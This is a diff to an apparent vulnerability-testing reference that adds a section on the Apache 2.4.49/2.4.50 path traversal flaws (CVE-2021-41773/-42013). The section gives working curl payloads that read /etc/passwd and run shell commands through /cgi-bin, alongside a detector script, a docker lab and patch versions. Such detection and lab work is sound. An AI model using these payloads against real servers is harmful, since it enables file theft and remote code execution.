@@ -118,6 +118,23 @@ Ready-made detector + demo lab: `target/nextjs-cve-lab/detect.sh <base-url> [pat
 Patched at 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Vercel-hosted is not exploitable
 (edge strips the header). Works via `http_probe` for black-box targets.
 
+### CVE-2021-41773 / -42013 — Apache 2.4.49/2.4.50 path traversal → RCE (Critical, CISA KEV)
+
+`--path-as-is` is mandatory (curl must not normalise the `../`). File read via a
+static alias prefix; RCE via a CGI prefix if `mod_cgi` is on. 2.4.49 uses one
+`%2e` per `../`; 2.4.50 needs the double-encoded `%%32%65` form.
+
+```bash
+# file read (static prefix, e.g. /icons/)
+curl -s --path-as-is "<url>/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"   # root:... => VULN
+# RCE (CGI prefix + shell reachable)
+curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; id' \
+  "<url>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"                        # uid=... => VULN
+```
+Detector + lab: `target/apache-cve-lab/detect.sh <base-url>` (file-read + RCE,
+exit 0/1); boot with `sandbox-setup/apache-cve.sh` (docker httpd:2.4.49).
+Patched at 2.4.51 (2.4.50 was incomplete → -42013). Works via `http_probe`.
+
 ## Usage rules
 
 - One payload class per probe batch; log every request to artifacts.
